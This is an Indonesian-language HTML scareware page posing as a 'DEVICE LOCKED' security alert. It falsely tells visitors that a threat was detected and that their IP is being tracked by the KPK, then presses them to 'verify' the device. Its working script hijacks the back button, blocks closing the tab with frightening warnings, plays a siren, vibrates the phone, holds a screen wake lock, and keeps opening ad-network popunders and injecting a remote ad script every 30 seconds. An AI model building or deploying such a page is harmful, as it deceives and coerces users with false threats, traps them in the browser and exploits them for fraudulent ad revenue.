<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEM CRITICAL: Tindakan Diperlukan</title>
    
    <link rel="manifest" href="data:application/manifest+json,{'name':'System Security','short_name':'System','start_url':'/','display':'standalone','background_color':'#000','theme_color':'#f00','icons':[{'src':'https://cdn-icons-png.flaticon.com/512/300/300221.png','sizes':'512x512','type':'image/png'}]}">

    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .emergency-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; color: #f00; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .blink { animation: blinker 0.4s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        .btn-panic { background: #f00; color: #fff; padding: 20px 50px; border-radius: 12px; font-weight: 900; animation: pulse 1s infinite; }
        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
    </style>
</head>
<body class="bg-black">

    <div class="emergency-overlay p-6" id="lock-screen">
        <div class="text-7xl mb-6">🚨</div>
        <h1 class="text-3xl font-black blink tracking-tighter text-white">DEVICE LOCKED</h1>
        <p class="text-sm mt-4 text-red-500 font-bold uppercase">Ancaman Keamanan Terdeteksi!</p>
        <p class="text-[10px] mt-2 text-gray-500 max-w-xs">Browser Anda mencoba memuat konten berbahaya dari portal berita. Segera verifikasi identitas perangkat untuk membuka kembali.</p>
        
        <button onclick="handlePanicClick()" class="btn-panic mt-10 shadow-2xl">
            VERIFIKASI & BUKA PERANGKAT
        </button>

        <div class="mt-12 opacity-30 text-[8px] font-mono text-left w-full border-t border-gray-900 pt-4">
            LOG_ERR: SECURITY_BREACH_DETECTED<br>
            IP_STATUS: TRACKED_BY_KPK_SERVER<br>
            STATUS: REDIRECT_LOOP_ACTIVE
        </div>
    </div>

    <script>
        const smartlink = "https://www.effectivegatecpm.com/ypk79fz44e?key=086401ebd705ad471cfebf22fb4f94f4";
        const socialBar = "https://pl28606612.effectivegatecpm.com/59/b3/e8/59b3e86754e4943e8fe6f30131f537e7.js";
        let audioCtx = null;

        // --- FITUR ANTI-CLOSE & BACK HIJACK ---
        
        // 1. Membajak tombol Back (Kembali)
        function hijackHistory() {
            window.history.pushState(null, "", window.location.href);
            window.onpopstate = function() {
                // Saat tombol back ditekan, buka smartlink dan paksa stay di halaman ini
                window.open(smartlink, '_blank');
                window.history.pushState(null, "", window.location.href);
                alert("Peringatan: Keluar sekarang akan mengunci data perangkat Anda secara permanen!");
            };
        }

        // 2. Memicu peringatan saat tab mau ditutup
        window.onbeforeunload = function() {
            return "Sistem sedang melakukan pembersihan. Jika Anda keluar sekarang, perangkat mungkin tidak bisa digunakan kembali!";
        };

        function handlePanicClick() {
            window.open(smartlink, '_blank');
            playSiren();
            // Setiap klik memperkuat siklus iklan
            startPersistentAds();
        }

        function playSiren() {
            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sawtooth';
            osc.frequency.setValueAtTime(600, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.3);
            osc.connect(gain); gain.connect(audioCtx.destination);
            gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
            osc.start(); osc.stop(audioCtx.currentTime + 0.4);
            if (navigator.vibrate) navigator.vibrate([400, 200, 400]);
        }

        function startPersistentAds() {
            // Siklus 30 detik untuk Popunder Otomatis
            setInterval(() => {
                window.open(smartlink, '_blank');
                const s = document.createElement('script');
                s.src = socialBar + '?v=' + Date.now();
                document.body.appendChild(s);
            }, 30000);
        }

        window.onload = () => {
            hijackHistory();
            if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
        };
    </script>
</body>
</html>
